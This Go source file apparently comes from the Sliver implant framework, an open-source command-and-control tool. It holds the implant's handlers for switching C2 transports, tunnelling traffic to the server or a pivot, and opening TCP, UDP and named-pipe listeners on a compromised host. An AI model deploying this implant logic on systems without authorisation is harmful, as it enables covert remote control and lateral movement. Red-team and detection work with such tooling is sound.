package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net/url"
	"time"

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/comm"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/commpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var commHandlers = map[uint32]CommHandler{
	sliverpb.MsgCommTunnelOpenReq: commTunnelHandler,
	sliverpb.MsgCommTunnelData:    commTunnelDataHandler,

	sliverpb.MsgHandlerStartReq: startHandler,
	sliverpb.MsgHandlerCloseReq: closeHandler,

	sliverpb.MsgTransportsReq:      transportsHandler,
	sliverpb.MsgAddTransportReq:    addTransportHandler,
	sliverpb.MsgDeleteTransportReq: deleteTransportHandler,
	sliverpb.MsgSwitchTransportReq: transportSwitchHandler,
}

// GetCommHandlers - Returns a map of route handlers
func GetCommHandlers() map[uint32]CommHandler {
	return commHandlers
}

// Transports -------------------------------------------------------------------------------------------

func transportsHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	req := &commpb.TransportsReq{}
	proto.Unmarshal(envelope.Data, req)
	res := &commpb.Transports{Response: &commonpb.Response{}}

	for _, tp := range transports.Transports.Available {
		res.Available = append(res.Available, &commpb.TransportC2{ID: tp.ID, URL: tp.URL.String()})
	}

	// Response
	data, _ := proto.Marshal(res)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

func addTransportHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	req := &commpb.TransportAddReq{}
	proto.Unmarshal(envelope.Data, req)
	res := &commpb.TransportAdd{Response: &commonpb.Response{}}

	addr, err := url.Parse(req.URL)
	if addr == nil || err != nil {
		res.Success = false
		res.Response.Err = "failed to parse transport URL"
		data, _ := proto.Marshal(res)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}

	// Instantiate the transport.
	tp, err := transports.NewTransport(addr)
	if err != nil {
		res.Success = false
		res.Response.Err = err.Error()
		data, _ := proto.Marshal(res)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}

	// Add to available transports
	transports.Transports.Add(tp)
	res.Success = true

	// Response
	data, _ := proto.Marshal(res)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

func deleteTransportHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	req := &commpb.TransportDeleteReq{}
	proto.Unmarshal(envelope.Data, req)
	res := &commpb.TransportDelete{Response: &commonpb.Response{}}

	transports.Transports.Remove(req.ID)
	res.Success = true

	// Response
	data, _ := proto.Marshal(res)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

func transportSwitchHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	req := &commpb.TransportSwitchReq{}
	proto.Unmarshal(envelope.Data, req)
	res := &commpb.TransportSwitch{Response: &commonpb.Response{}}

	// Get the transport for the ID, if not 0, and switch to it found
	if req.ID != 0 {
		tp := transports.Transports.Get(req.ID)
		if tp == nil {
			data, _ := proto.Marshal(res)
			connection.Send <- &sliverpb.Envelope{
				ID:   envelope.GetID(),
				Data: data,
			}
			return
		}

		// Send the response before doing the switch
		res.Success = true
		data, _ := proto.Marshal(res)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}

		// Wait a little to be sure the response has been sent.
		time.Sleep(500 * time.Millisecond)

		err := transports.Transports.Switch(tp.ID)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Transport switch error: %s", err.Error())
			// {{end}}
		}
	}

	// Parse the URL if any, and add transport
	if req.ID == 0 && req.URL != "" {
		addr, err := url.Parse(req.URL)
		if addr == nil || err != nil {
			res.Success = false
			res.Response.Err = "failed to parse transport URL"
			data, _ := proto.Marshal(res)
			connection.Send <- &sliverpb.Envelope{
				ID:   envelope.GetID(),
				Data: data,
			}
			return
		}

		// Instantiate the transport.
		tp, err := transports.NewTransport(addr)
		if err != nil {
			res.Success = false
			res.Response.Err = err.Error()
			data, _ := proto.Marshal(res)
			connection.Send <- &sliverpb.Envelope{
				ID:   envelope.GetID(),
				Data: data,
			}
			return
		}

		// Add to available transports
		transports.Transports.Add(tp)

		// Switch with the new
		res.Success = true
		data, _ := proto.Marshal(res)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}

		// Wait a little to be sure the response has been sent.
		time.Sleep(500 * time.Millisecond)

		err = transports.Transports.Switch(tp.ID)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Transport switch error: %s", err.Error())
			// {{end}}
		}
	}
}

// Comm Handlers ----------------------------------------------------------------------------------------

// commTunnelHandler - A special handler that receives a Tunnel ID (sent by the server or a pivot)
// and gives this tunnel ID to the current active Transport. The latter passes it down to the Comm
// system, which creates the tunnel and uses it as a net.Conn for speaking with the C2 server/pivot.
func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	data := &commpb.TunnelOpenReq{}
	proto.Unmarshal(envelope.Data, data)

	// {{if .Config.Debug}}
	log.Printf("[tunnel] Received Comm Tunnel request (ID %d)", data.TunnelID)
	// {{end}}

	// Create and start a Tunnel. It is already wired up to its transports.Connection, thus working.
	tunnel := comm.NewTunnel(data.TunnelID, transports.Transports.Server.C2.Send)

	// Private key used to decrypt server Comm data
	key := transports.GetImplantPrivateKey()

	// Comm setup. This is goes on in the background, because we need
	// to end this handler, (otherwise it blocks and the tunnel will stay dry)
	go comm.InitClient(tunnel, key)

	muxResp, _ := proto.Marshal(&commpb.TunnelOpen{
		Success:  true,
		Response: &commonpb.Response{},
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: muxResp,
	}
}

// commTunnelDataHandler - Receives tunnel data over the implant's connection (in case the stack used is custom DNS/HTTPS),
// and passes it down to the appropriate Comm tunnel. Will be written to its buffer, then consumed by the Comm's SSH layer.
func commTunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	data := &commpb.TunnelData{}
	proto.Unmarshal(envelope.Data, data)
	tunnel := comm.Tunnels.Tunnel(data.TunnelID)
	for {
		switch {
		case tunnel != nil:
			tunnel.FromServer <- data
			// {{if .Config.Debug}}
			log.Printf("[tunnel] From server %d bytes", len(data.Data))
			// {{end}}
			return
			// TODO: Maybe return the data back to the implant, marked with non-receive indications.
		default:
			// {{if .Config.Debug}}
			log.Printf("[tunnel] No tunnel found for ID %d (Seq: %d)", data.TunnelID, data.Sequence)
			// {{end}}
			time.Sleep(100 * time.Millisecond)
			continue
		}
	}
}

// Listener/Dialer Handlers -----------------------------------------------------------------------------

// startHandler - Start a listener/bind handler on this implant. The handler keeps some information
// and will transmit it with the connections it routes back to/forwards from the server.
func startHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	// Request / Response
	handlerReq := &commpb.HandlerStartReq{}
	err := proto.Unmarshal(envelope.Data, handlerReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	handlerRes := &commpb.HandlerStart{Response: &commonpb.Response{}}

	// The application-layer protocol prevails over the trasport protocol
	switch handlerReq.Handler.Application {
	// Named pipes
	case commpb.Application_NamedPipe:
		// {{if .Config.NamePipec2Enabled}}
		_, err := comm.ListenNamedPipe(handlerReq.Handler) // Adds the listener to the jobs.
		if err != nil {
			handlerRes.Success = false
			handlerRes.Response.Err = err.Error()
			break
		}
		handlerRes.Success = true
		// {{end}} -NamePipec2Enabled
	default:
		goto TRANSPORT
	}

	// Fallback on the transport protocol
TRANSPORT:
	switch handlerReq.Handler.Transport {
	// TCP
	case commpb.Transport_TCP:
		_, err := comm.ListenTCP(handlerReq.Handler) // Adds the listener to the jobs.
		if err != nil {
			handlerRes.Success = false
			handlerRes.Response.Err = err.Error()
			break
		}
		handlerRes.Success = true

	// UDP
	case commpb.Transport_UDP:
		err := comm.ListenUDP(handlerReq.Handler) // Adds the lsitener to the jobs.
		if err != nil {
			handlerRes.Success = false
			handlerRes.Response.Err = err.Error()
			break
		}
		handlerRes.Success = true

	default:
	}

	// Response
	data, _ := proto.Marshal(handlerRes)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

// closeHandler - Stops/Close a listener on this implant.
func closeHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	// Request / Response
	handlerReq := &commpb.HandlerCloseReq{}
	err := proto.Unmarshal(envelope.Data, handlerReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	handlerRes := &commpb.HandlerClose{Response: &commonpb.Response{}}

	// Call job stop
	err = comm.Listeners.Remove(handlerReq.Handler.ID)
	if err != nil {
		handlerRes.Success = false
		handlerRes.Response.Err = err.Error()
	} else {
		handlerRes.Success = true
	}

	// Response
	data, _ := proto.Marshal(handlerRes)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}
